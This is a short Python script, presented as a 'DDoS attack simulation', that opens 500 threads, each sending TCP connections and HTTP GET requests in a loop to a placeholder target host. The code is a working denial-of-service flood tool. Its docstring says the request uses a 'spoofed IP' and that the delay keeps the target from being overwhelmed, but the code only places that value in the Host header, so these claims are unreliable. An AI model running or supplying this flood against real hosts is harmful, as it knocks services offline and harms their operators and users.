import threading
import socket
import time
import sys

"""
    Execute a network attack by continuously sending HTTP GET requests to a target.

    The function runs in a loop until the attack_event flag is set, attempting to:
    1. Create a TCP socket connection to the target
    2. Send a HTTP GET request with a spoofed IP
    3. Close the connection
    4. Wait for a short delay before the next attempt

    Global Variables Used:
        attack_event (threading.Event): Controls the attack loop
        target (str): Target host address
        port (int): Target port number
        fake_ip (str): Spoofed IP address for the HTTP request

    Returns:
        None

    Raises:
        Catches and prints all exceptions that occur during the attack

    Note:
        - The function includes a 10ms delay between requests to prevent overwhelming
        - Uses TCP (SOCK_STREAM) for connection
        - This function is designed to run in a separate thread
    """

target = "target_host"  # Replace with the actual target host
port = 80
fake_ip = "fake_ip_address"  # Replace with a spoofed IP address
num_threads = 500
attack_event = threading.Event()


def attack():

    while not attack_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            request = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode("utf-8")
            s.send(request)
            s.close()
            time.sleep(0.01)
        except Exception as e:
            print(f"Error: {e}")


def start_attack():
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)
    return threads


if __name__ == "__main__":
    print("Starting DDoS attack simulation...")
    threads = start_attack()
    print(f"Attack started with {num_threads} threads. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)  # Non-busy wait to keep main thread alive
    except KeyboardInterrupt:
        print("Stopping attack...")
        attack_event.set()  # Signal threads to stop
        for thread in threads:
            thread.join()  # Wait for threads to finish
        print("Attack stopped.")
        sys.exit(0)
